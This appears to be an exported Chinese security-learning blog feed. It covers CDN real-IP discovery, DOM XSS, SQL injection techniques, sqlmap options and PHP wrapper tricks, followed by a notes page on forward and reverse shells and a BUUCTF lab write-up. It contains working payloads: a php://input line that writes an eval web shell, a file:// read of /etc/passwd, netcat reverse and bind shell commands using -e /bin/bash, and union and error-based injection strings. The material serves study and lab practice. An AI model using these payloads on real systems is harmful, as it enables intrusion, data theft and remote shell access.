title="蜜罐"></a>蜜罐</h1><p>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><p>传统访问：用户访问域名–&gt;解析服务器 IP–&gt;访问目标主机<br>普通 CDN：用户访问域名–&gt;CDN 节点–&gt;真实服务器 IP–&gt;访问目标主机<br>带 WAF的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt;真实服务器 IP–&gt;访问目标主机</p><p>使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。<br><a href="https://ping.chinaz.com/" title="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><h2 id="绕过CDN查找真实ip"><a href="#绕过CDN查找真实ip" class="headerlink" title="绕过CDN查找真实ip"></a>绕过CDN查找真实ip</h2><ul><li>有些站点的主站使用了CDN，某些子域名可能未使用。一般子域名极有可能和主站保持同一IP，所以扫描子域名可以查找到真实IP。</li><li>目标站点存在漏洞，如phpinfo敏感信息泄露，github信息泄露等。若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</li><li>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。<a href="http://www.17ce.com/" title="http://www.17ce.com/">http://www.17ce.com/</a></li><li>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析，在邮件源码里面就会包含服务器的真实 IP。</li><li>FOFA付费服务：云资产原始IP查询</li></ul><h1 id="红队信息收集"><a href="#红队信息收集" class="headerlink" title="红队信息收集"></a>红队信息收集</h1><p><a href="https://www.cnblogs.com/AffectedFish/p/16926959.html">https://www.cnblogs.com/AffectedFish/p/16926959.html</a><br><a href="https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&u_asig=1a0c399d17323596204497915e003a">https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&amp;u_asig=1a0c399d17323596204497915e003a</a></p><h1 id="身份验证技术"><a href="#身份验证技术" class="headerlink" title="身份验证技术"></a>身份验证技术</h1><h2 id="Cookie-Session"><a href="#Cookie-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h2><p>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制。</p><p>1.存储位置不同：<br>Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p><p>2.安全性不同：<br>Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p><p>3.存储容量不同：<br>Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p><p>4.生命周期不同：<br>Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p><p>5.访问方式不同：<br>Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p><p>6.使用场景不同：<br>Cookie一般用于存储小型的数据，如用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在<strong>每次</strong>请求时发送给服务器进行身份验证。如果这时对用户名及密码进行抓包爆破，即使密码正确也无法成功登录，因为token对应不上。</p><p>保证了数据包的唯一性，防止暴力破解。</p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>DOM 将 HTML 文档解析为一个由节点组成的树，称为 DOM 树。每个节点表示文档中的一个部分（例如元素、文本、属性等）。开发者可以通过JavaScript访问、修改和动态更新文档的内容、结构和样式。</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结构：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><br>├── <span class="hljs-selector-tag">p</span><br>│   └── <span class="hljs-selector-tag">Text</span>: <span class="hljs-string">&quot;Hello&quot;</span><br>└── p<br>    └── Text: <span class="hljs-string">&quot;World&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="DOM-的常用操作"><a href="#DOM-的常用操作" class="headerlink" title="DOM 的常用操作"></a>DOM 的常用操作</h2><h3 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 这是标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br>document.querySelector(&#x27;h1&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br>document.querySelector(&#x27;.id&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br>document.querySelector(&#x27;#myHeader&#x27;)<br></code></pre></td></tr></table></figure><h3 id="获取对象属性"><a href="#获取对象属性" class="headerlink" title="获取对象属性"></a>获取对象属性</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- HTML代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 选择第一个 h1 元素</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> h1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  **<span class="hljs-comment">// 获取 h1 元素的 id 属性</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> id = h1.<span class="hljs-property">id</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 输出 id 到控制台</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(id);**</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用DOM实现图片更新操作"><a href="#利用DOM实现图片更新操作" class="headerlink" title="利用DOM实现图片更新操作"></a>利用DOM实现图片更新操作</h2><p><img src="/../images/Pasted%20image%2020241124221938.png"></p><p>更换图片只需修改img.src：</p><p><img src="/../images/Pasted%20image%2020241124222246.png"></p><p>如果这里2.png是一个用户传递的变量，就会造成<strong>DOM型XSS</strong>。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>原理：接受的参数值未进行过滤直接带入SQL查询。</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>在注入过程中，获取的数据不能回显至前端页面，常规的联合查询注入不行，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p><p>注入逻辑：</p><ul><li>当条件为真时，页面正常返回；为假时，页面异常或没有数据返回。</li><li>攻击者可以通过逐字符猜测数据。</li></ul><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">7</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;pi&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span>;<br><span class="hljs-keyword">and</span> ord(left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">112</span>;<br></code></pre></td></tr></table></figure><p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p><p>注入逻辑：</p><ul><li>如果条件成立，则执行 SLEEP() 或类似延迟函数，页面响应时间增加；否则立即返回。</li><li>攻击者逐字符猜测数据库名、表名等信息。</li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> sleep(<span class="hljs-number">1</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&lt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(length(database())=<span class="hljs-number">7</span>,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(and left(database(),<span class="hljs-number">2</span>)=&#x27;pi&#x27;,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>3、基于报错的SQL盲注-报错回显</p><p>数据库通常会在语法错误或非法操作时抛出详细的错误消息。通过构造特定的恶意 SQL 语句，使数据库抛出错误，从错误中提取信息。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> datebase()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x5c</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园</a></p><p>测试站点：<a href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a></p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">--current-db</span>   <span class="hljs-comment">#获取当前数据库名</span><br><br><span class="hljs-built_in">--tables</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>     <span class="hljs-comment">#获取表名</span><br><br><span class="hljs-built_in">--columns</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取列名</span><br><br><span class="hljs-built_in">--dump</span> -<span class="hljs-string">C</span> <span class="hljs-string">&quot;列名&quot;</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取数据</span><br><br></code></pre></td></tr></table></figure><p>MYSQL区分root和非root:</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment">#引出权限：</span><br><span class="hljs-built_in">--privileges</span>     <span class="hljs-comment"># 查看权限</span><br><span class="hljs-built_in">--is-dba</span>    <span class="hljs-comment"># 是否是数据库管理员</span><br><br><span class="hljs-built_in">--sql-shell</span> <span class="hljs-comment"># 执行指定sql命令</span><br><br><span class="hljs-comment">#引出文件：</span><br><span class="hljs-built_in">--file-read</span>     <span class="hljs-comment"># 读取指定文件</span><br><span class="hljs-built_in">--file-write</span>      <span class="hljs-comment"># 写入本地文件</span><br><span class="hljs-built_in">--file-dest</span> <br><br><span class="hljs-comment">#引出命令：</span><br><span class="hljs-built_in">--os-cmd=calc</span>  <span class="hljs-comment"># 调出计算器</span><br><span class="hljs-built_in">--os-shell</span> <br><span class="hljs-built_in">--sql-shell</span><br><br><span class="hljs-comment">#提交方法：</span><br><span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment"># 表单里POST请求，抓包找数据请求，不推荐</span><br><br><span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment"># Cookie，不推荐</span><br><br>-<span class="hljs-string">r</span> <span class="hljs-string">1</span>.<span class="hljs-string">txt</span>    <span class="hljs-comment"># 推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，后面加上星号（*）标明注入点</span><br><br></code></pre></td></tr></table></figure><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p><img src="/../images/Pasted%20image%2020241129165616.png"></p><ul><li>文件读取：</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd  <span class="hljs-comment"># 绝对路径</span><br><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phpinfo.php  <span class="hljs-comment"># 相对路径</span><br></code></pre></td></tr></table></figure><ul><li>文件写入：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=phpinfo.php  </span><br>POST data: content=base64的数据<br><span class="hljs-comment"># 需要在代码中有类似file_put_contents($_GET[&#x27;file&#x27;],$_POST[&#x27;content&#x27;])写法</span><br><br>php:<span class="hljs-comment">//input </span><br>POST data:<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>代码执行：</li></ul><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php://input POST:</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS&quot;&gt;&lt;a href=&quot;#JS&quot; class=&quot;headerlink&quot; title=&quot;JS&quot;&gt;&lt;/a&gt;JS&lt;/h1&gt;&lt;p&gt;流行的JS框架有Vue、NodeJS、jQuery、Angular等。&lt;/p&gt;
&lt;p&gt;JS安全问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;源码泄漏&lt;/</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>反弹SHELL</title>
    <link href="http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/"/>
    <id>http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/</id>
    <published>2024-11-20T07:12:05.000Z</published>
    <updated>2024-12-09T08:32:41.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p>正向代理是一种代理服务器，位于客户端和目标服务器之间，代理客户端向目标服务器发送请求。客户端通过正向代理访问无法直接访问的资源。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a><strong>工作流程</strong></h3><ul><li>客户端 -&gt; 正向代理服务器 -&gt; 目标服务器。</li><li>客户端明确知道自己正在通过代理访问。</li></ul><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a><strong>用途</strong></h3><ul><li><strong>突破网络限制</strong>：访问被防火墙或地理位置限制的资源（例如翻墙）。</li><li><strong>匿名访问</strong>：隐藏客户端的真实 IP 地址。</li><li><strong>缓存加速</strong>：通过缓存常用资源减少重复请求。</li></ul><h3 id="典型应用场景"><a href="#典型应用场景" class="headerlink" title="典型应用场景"></a><strong>典型应用场景</strong></h3><ul><li>企业内部通过正向代理访问互联网。</li><li>使用 VPN 或 Shadowsocks 等工具突破地理限制。</li></ul><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>反向代理是一种代理服务器，位于目标服务器和客户端之间，代理目标服务器向客户端返回资源。客户端的请求通过反向代理访问服务器。</p><h3 id="工作流程-1"><a href="#工作流程-1" class="headerlink" title="工作流程"></a>工作流程</h3><ul><li>客户端 -&gt; 反向代理服务器 -&gt; 后端服务器。</li><li>客户端通常不知道自己访问的是反向代理。</li></ul><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ul><li><strong>负载均衡</strong>：分发请求到多台后端服务器，减轻单一服务器的压力。</li><li><strong>隐藏服务器信息</strong>：保护后端服务器的 IP 和架构信息。</li><li><strong>缓存与加速</strong>：为静态资源提供缓存，减少后端压力。</li><li><strong>SSL 卸载</strong>：反向代理负责处理 HTTPS 请求，减轻后端服务器的计算负担。</li></ul><h3 id="典型应用场景-1"><a href="#典型应用场景-1" class="headerlink" title="典型应用场景"></a>典型应用场景</h3><ul><li>使用 Nginx 或 Apache 作为反向代理，处理多个后端服务器的请求。</li><li>CDN（内容分发网络）服务，代理请求到最近的缓存服务器或源站。</li><li>Web 应用防火墙（WAF）通过反向代理部署。</li></ul><h1 id="正反向连接"><a href="#正反向连接" class="headerlink" title="正反向连接"></a>正反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>客户端主动发起连接到服务器或目标系统。正向连接通常用于客户端-服务器通信，客户端主动请求服务或资源，例如网页浏览、电子邮件发送和接收等。在正向连接中，客户端充当主动方，向服务器发起连接请求，然后服务器接受并处理请求。</p><h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>正向 Shell 是目标主机主动开放一个端口，监听外部的连接请求（通常由攻击者发起）。攻击者通过连接该端口获得目标系统的命令行访问权限。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>目标主机开启一个监听服务，等待连接请求。</li><li>攻击者主动连接到目标主机的开放端口。</li><li>连接建立后，攻击者可以通过该 Shell 发送命令并与目标主机交互。</li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>主动监听：目标主机需要开放一个端口，等待外部连接。</li><li>常见于漏洞利用后：例如在获得目标系统访问权限后，用来建立长期连接。</li><li>依赖网络开放性：如果目标主机被防火墙或 NAT 保护，正向 Shell 的端口可能无法被外部访问。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在目标主机上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 表示监听模式。</li><li><code>-v</code>: 开启详细输出。</li><li><code>-p</code>: 指定监听的端口（如 8888）。</li><li><code>-e</code>: 指定要执行的程序（这里是 <code>/bin/bash</code>）。</li></ul><p>攻击者在自己的机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 目标IP <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>目标系统（通常是受害者）主动建立与控制系统或服务器的连接。反向连接通常用于合法的远程管理和控制，例如远程桌面会话、SSH远程管理等。在反向连接中，目标系统充当客户端，主动连接到远程服务器或控制服务器，以接受命令并将结果返回。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>反弹 Shell 是目标主机主动向攻击者的主机发起连接，将其 Shell 权限回传给攻击者。通常用于目标主机位于防火墙或 NAT 后，无法直接被外部访问时。</p><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>攻击者在自己的机器上开启一个监听端口。</li><li>目标主机通过一个有效载荷（Payload）主动连接到攻击者的监听端口。</li><li>连接建立后，目标主机的命令行权限被转交给攻击者。</li></ol><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>绕过防火墙和 NAT：目标主机通过反向连接绕过自身的网络限制。</li><li>攻击者被动监听：攻击者只需要等待目标主机发起连接。</li><li>更常见于实际渗透：尤其是目标系统网络环境受限时。</li></ul><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>攻击者在本地机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标主机上执行： </p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 攻击者IP <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><p>反弹Shell命令一键生成：<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正反向代理&quot;&gt;&lt;a href=&quot;#正反向代理&quot; class=&quot;headerlink&quot; title=&quot;正反向代理&quot;&gt;&lt;/a&gt;正反向代理&lt;/h1&gt;&lt;h2 id=&quot;正向代理&quot;&gt;&lt;a href=&quot;#正向代理&quot; class=&quot;headerlink&quot; title=&quot;正向代理&quot;</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-N1BOOK</title>
    <link href="http://example.com/2024/11/12/BUUCTF-N1BOOK/"/>
    <id>http://example.com/2024/11/12/BUUCTF-N1BOOK/</id>
    <published>2024-11-12T03:36:37.000Z</published>
    <updated>2024-12-09T08:32:53.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h1><p>dirsearch -u <a href="http://74394245-f26a-46d0-92c9-6cead1346fa4.node5.buuoj.cn:81/">http://74394245-f26a-46d0-92c9-6cead1346fa4.node5.buuoj.cn:81/</a></p><p><img src="/../images/Pasted%20image%2020241112113724.png"><br><img src="/../images/Pasted%20image%2020241112113754.png"></p><p>之后没有思路，查看题解发现：</p><p><img src="/../images/Pasted%20image%2020241112114242.png"><br><img src="/../images/Pasted%20image%2020241112115633.png"></p><p>flag1:n1book{info_1   flag2:s_v3ry_im   flag3:p0rtant_hack}</p><h1 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h1><p><img src="/../images/Pasted%20image%2020241112115853.png"></p><p>githacker –url <a href="http://83d9dee3-3f90-4977-9cc5-99d26b130a8b.node5.buuoj.cn:81/.git">http://83d9dee3-3f90-4977-9cc5-99d26b130a8b.node5.buuoj.cn:81/.git</a> –output-folder git</p><p>在githacker文件夹目录下会生成index.html，得到flag</p><h1 id="第一章-web入门-SQL注入-有回显"><a href="#第一章-web入门-SQL注入-有回显" class="headerlink" title="[第一章 web入门]SQL注入-有回显"></a>[第一章 web入门]SQL注入-有回显</h1><ol><li>判断注入方式：id&#x3D;2-1和id&#x3D;1回显不同，证明是字符型注入。</li><li>判断闭合方式：id&#x3D;1’无回显，id&#x3D;1”有回显，证明闭合方式是单引号。</li><li>判断字段数：id&#x3D;1’ order by 3– - 有回显，id&#x3D;1’ order by 4– -无回显，证明有3个字段。注意这里用#注释无效，需用– -</li><li>获取数据库名：id&#x3D;-1’ union select 1,database(),3 – -，注意要让第一条数据不显示。</li><li>获取表名：id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’note’– -，显示fl4g,notes。或者直接table_schema&#x3D;database()。</li><li>获取列名：id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’fl4g’ and table_schema&#x3D;’note’ – -，显示fllllag。</li><li>获取flag: id&#x3D;-1’ union select 1,2, fllllag from fl4g– -，显示n1book{union_select_is_so_cool}。</li></ol><h1 id="第一章-web入门-SQL注入-无回显"><a href="#第一章-web入门-SQL注入-无回显" class="headerlink" title="[第一章 web入门]SQL注入-无回显"></a>[第一章 web入门]SQL注入-无回显</h1><p><img src="/../images/Pasted%20image%2020241112160628.png"></p><p><img src="/../images/Pasted%20image%2020241112160843.png"></p><p>报错信息是一串unicode编码。<br><img src="/../images/Pasted%20image%2020241112161433.png"><br>账号名改成admin，报错信息解码后为：账号或密码错误。证明这是字符型注入。</p><p>接下来判断闭合方式，发现是单引号。pass的值不重要，注入时会被注释掉。<br><img src="/../images/Pasted%20image%2020241112161809.png"></p><p>由于开启了mysql的错误提示，报错会进行回显，于是使用报错注入：</p><ol><li><p>获取数据库名：name&#x3D;admin’ and updatexml(1,concat(0x7e,database()),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112165437.png"></p></li><li><p>获取表名：name&#x3D;admin’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’note’)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112170220.png"></p></li></ol><p>由于不展示select到的值，判断select被过滤。根据mysql对大小写不敏感，从而使用大小写绕过，sElect代替select。<br><img src="/../images/Pasted%20image%2020241112170436.png"></p><ol start="3"><li><p>获取列名：name&#x3D;admin’ and updatexml(1,concat(0x7e,(sElect group_concat(column_name) from information_schema.columns where table_name&#x3D;’fl4g’ and table_schema&#x3D;’note’)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112170819.png"></p></li><li><p>获取flag: name&#x3D;admin’ and updatexml(1,concat(0x7e,(sElect flag from fl4g)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112171015.png"></p></li></ol><blockquote><p>[!NOTE] 